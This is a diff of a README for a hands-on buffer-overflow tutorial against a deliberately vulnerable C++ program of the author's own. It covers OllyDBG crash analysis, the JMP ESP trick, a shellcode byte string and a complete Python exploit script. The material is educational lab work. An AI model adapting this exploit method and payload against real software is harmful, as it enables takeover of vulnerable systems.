@@ -1,5 +1,31 @@
 # Smashing the Stack by e41c m.
 
+## TLDR: 
+
+What's Included:
+
+1. Pre-compiled vulnerable executable
+2. Python 2.7 script to help exploit it
+3. Visual Studio Project for executable
+
+Run the python script to exploit a simple vulnerable C++ program (code below)
+
+It will exploit the program by crafting a special input string that takes over the processor and instead runs code from the input string rather than the programs own instructions.
+
+This occurs a lot and is one of the most common methods of taking control of a server, gaining root access on machine, jailbreaking devices, etc.
+
+Tested on Python 2.7
+
+In Python 3, strings are stored as unicode, not ASCII so this won't work.
+
+`python runner.py`
+
+The script needs to be customized with a return address for `JMP ESP` that works on your machine.
+
+Since we all have different versions of DLL files and stuff like that, you must customize the return address for your machine.
+
+
+
 ## What is a Buffer Overflow Exploit?
 
 In ASM and many C/C++ implementations, if you allocate an array and add more items to the array that it can contain, it will let you. In ASM, any memory (belonging to your program) can be accessed and manipulated by assembly instructions.
@@ -276,15 +302,15 @@ therefore, executing their input string as valid assembly language.
 
 ## Overwriting the return address
 
-`bad("aaaa")` this does not cause a problem, the string "aaaa" gets copied into the buffer where it fits nicely.
+`bad("AAAA")` this does not cause a problem, the string "AAAA" gets copied into the buffer where it fits nicely.
 
-`bad("aaaab")` this does not cause a big problem, the string "aaaab" gets copied into the buffer where it overwrites the null-terminator of the string with 'b'
+`bad("AAAAB")` this does not cause a big problem, the string "AAAAB" gets copied into the buffer where it overwrites the null-terminator of the string with 'B'
 
-`bad("aaaabcc")` causes a problem. the value of EBP on the stack is partially overridden by two "c". 
+`bad("AAAABCC")` causes a problem. the value of EBP on the stack is partially overridden by two "C". 
 
-`bad("aaaabcccc")` causes a problem. the value of EBP on the stack is completely overridden and has value 43434343 in hex. "c" is represented by 43 in hex.
+`bad("AAAABCCCC")` causes a problem. the value of EBP on the stack is completely overridden and has value 43434343 in hex. "C" is represented by 43 in hex.
 
-`bad("aaaabccccdddd")` causes a huge problem. the value of the return address is overwritten. that means when bad() finishes executing it will try to execute the code at memory location 44444444. 44 is how you represent 'd' in hex.
+`bad("AAAABCCCCDDDD")` causes a huge problem. the value of the return address is overwritten. that means when bad() finishes executing it will try to execute the code at memory location 44444444. 44 is how you represent 'D' in hex.
 
 ## Customizing the return address
 
@@ -299,11 +325,11 @@ Then I look up in an ASCII chart the letters that go with the target bytes.
 | 78   | 'x'   |
 | 56   | 'V'   |
 | 34   | '4'   |
-| 41   | 'a'   |
+| 41   | 'A'   |
 
 
 
-Now I can overwrite the return address to go to execute the code at memory location 41345678 with a simple call to `bad("aaaabccccxV4a")`
+Now I can overwrite the return address to go to execute the code at memory location 41345678 with a simple call to `bad("AAAABCCCCxV4A")`
 
 **<u>WHAT IF THERE WAS VIRUS CODE AT MEMORY LOCATION 41345678??</u>**
 
@@ -321,17 +347,260 @@ Then, instead of inserting "aaaabcccc" you can insert the bytes that represent m
 
 
 
-# To Be Continued
+# Walkthrough
 
-### Example Simple Virus Code / Vulnerable Program
+## New Example Code
+
+Here is some example code that takes a command line argument and copies it to the **temp** string.
+
+I have compiled it with the proper settings in Visual Studio to be **insecure**. Nowadays, Visual Studio bloats your executable with stuff so that it can check at run-time for people exploiting these bugs.
+
+
+
+```c++
+#pragma check_stack(off)
+
+#include <string.h>
+#include <stdio.h> 
+#include <iostream>
+using namespace std;
+
+void dumb(char * word)
+{
+	char temp[500];
+	strcpy(temp, word);
+	cout << temp;
+}
+int main(int argc, char* argv[])
+{
+	dumb(argv[1]);
+	return 0;
+}
+```
+
+
+
+We can run the code on the command line and give it a string to copy like this:
+
+`program.exe thisisatestitshouldnotcauseproblems`
+
+Problems will only be caused when we put in a string that is 504 - 508+ characters in length, since that would overwrite the cached EBP on the stack and the cached return address. 
+
+
+
+## Exploiting
+
+We can exploit this program by filling the string with 508 things and overwriting the return address.
+
+500 things would not cause a problem. 504 things would overwrite the base pointer, 508 things overwrites the return address stored on the stack.
+
+
+
+### Example Virus Code
+
+The following bytes are virus code that I have created. It is not malicious. Trust me. I made it myself.
+
+```
+\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x52\x31\x63\x01\x68\x64\x42\x79\x33\x68\x48\x34\x63\x6b\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7
+```
+
+
+
+## Attempt 1 
+
+In OllyDBG I run the application and set the command line parameter to 507 "A"s. 
+
+You set command line arguments by going to Debug -> Arguments.
+
+
+
+The program crashes. Notice EBP has been overwritten and EIP was partially overwritten. (it is 00414142 because it tried to execute 00414141 then incremented EIP to go to the next instruction)
+
+We can try to overwrite EIP with exactly the memory location of our input string. If we can do that then we can replace our 'A's with virus code.
+
+![Crash Registers](crash_registers.png)
+
+Here is memory:
+
+![Crash Memory](crash_stack.png)
+
+
+
+Notice the memory address where the string of 41s start!
+
+We could overflow the buffer with 504 things (some of those things being our virus code) and making sure the last four ASCII characters represent the memory location 00 19 FC B8. 
+
+So 504 things then `\xB8\xFC\x19\x00` (remember little endian). 
+
+## Malicious String
+
+Note the instruction NOP or No-op is encoded as \x90 in hex.
+
+So we would make a string from the following HEX.
+
+First payload (113 bytes):
+
+`\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x52\x31\x63\x01\x68\x64\x42\x79\x33\x68\x48\x34\x63\x6b\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7`
+
+Then filler (391 bytes):
+
+`\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90`
+
+Then our return address `0019FCB8` in little endian hex (4 bytes):
+
+`\xB8\xFC\x19\x00`
+
+
+
+If we converted all that hex into a massive ASCII it would work ON SOME COMPUTERS.
+
+Generally not windows.
+
+## The Problem
+
+That last stupid byte has \x00. That hex terminates the string early. AGHHHH.
+
+It is a null terminator. Our stupid memory address that we have been working so hard to get to has 00 in it and we cannot represent that in ASCII because in ASCII 00 means end the string. GAHHHHH.
 
 ### JMP ESP Trick
 
+Instead of returning into our string. We are gonna do a trick.
+
+We are going to overflow the buffer with junk just enough to overflow the return address.
+
+Then, we are going to overflow it more with our malicious virus code.
+
+Why? Because ESP currently points to the location right after our string!
+
+Say What?
+
+![ESP](crash_memory2.png)
+
+Go look at the ESP register above and look what is on that line.
+
+There is stuff. But it comes after the 507 "41"s.
+
+If we put the payload after 508 things, we will put the payload right into memory location 0019FEB4.
+
+Ok, but why is that significant?
+
+Since ESP has the number 0019FEb4 in it, we don't need to write it in ASCII. We are trying to avoid encoding a string with a return address of 0019FEB4 because it has a null byte in it and would end our string early.
+
+Since ESP now has the number where we want to return to, if we could only `JMP ESP` that would teleport us right to our payload and ignite our virus code.
+
+Too bad we can't just `JMP ESP` because the whole thing we are trying to do is get our dang custom assembly to execute.
+
+### JMP'ing ESP anyway!
+
+To `JMP ESP` is easy:
+
+1. We find somewhere in memory that has the `JMP ESP` command in it.
+
+2. We write down the memory location
+
+3. If it does not have a null byte then we use that memory location as our return address
+
+4. if it does, we go back to step 1 and find another memory location with `JMP ESP` in it.
+
+   ​
+
+All of your programs code probably has 00 as its starting memory location. So thats wack.
+
+Instead, look for it in loaded DLL files!
+
+Lots of programs load helper libraries in the form of DLL files. Lets use one of those and borrow it to execute our JMP ESP command.
+
+Since these files are loaded in memory, you can overwrite the return address to execute any line of code in those DLL files.
+
+![EM](executable_modules.png)
+
+The base address for the EXE is at 00400000, no good.
+
+So lets use a line of code in KERNELBASE.dll since its base address starts at 74EE0000.
+
+1. Double-click KERNELBASE.dll
+
+2. Scroll through the code until you find a `JMP ESP` line of code.
+
+3. Write down the memory address if it does not have a 00, otherwise find another.
+
+4. (You can also search with CTRL-F instead of scrolling)
+
+   ​
+
+Woooo! I found one at `0FFF92ED`
+
+
+
+### Final Exploit
+
+Now, we have all the ingredients to craft our malicious string:
+
+1. 504 characters representing nothing, `NOP` or `\x90` in hex
+2. Our return address in hex (little endian): `\xED\x92\xff\x0f`
+3. Our payload: `\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x52\x31\x63\x01\x68\x64\x42\x79\x33\x68\x48\x34\x63\x6b\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7`
+
+
+
+We will use a Python script to help us type all this mess for us.
+
+
+
+```python
+import subprocess
+
+#reverse a string in python
+#we need to reverse the bytes
+#of the return address
+#little endian format
+def reversed_string(a_string):
+    return a_string[::-1]
+
+return_address = "\x0f\xff\x92\xED"
+payload = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x52\x31\x63\x01\x68\x64\x42\x79\x33\x68\x48\x34\x63\x6b\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"
+
+#504 bytes to overflow string and byte pointer
+exploit = "\x90" * 504
+
+#four more bytes with return address
+exploit += reversed_string(return_address)
+
+#add payload
+exploit += payload
+
+#run file with exploit string as argument
+subprocess.call(['bufferOverflow.exe', exploit])
+```
+
+
+
+![](hacked.png)
+
+
+
+### What the script does
+
+1. Makes a string with our 504 filler bytes of `NOP`
+
+2. Concatenates the return address (but reversed - little endian)
+
+3. Concatenates the virus code
+
+4. Executes the bufferOverflow.exe with the malicious string as a command line argument
+
+   ​
+
 ### Finding Virus Code
+
+You can find more virus code (not necessarily malicious) at https://www.exploit-db.com/shellcode/
+
+
 
 ### Creating Virus Code
 
+You can  take any assembly program and if you can convert it to bytes, you can use it as virus code.
 
+Google: Writing shell code
 
 
 
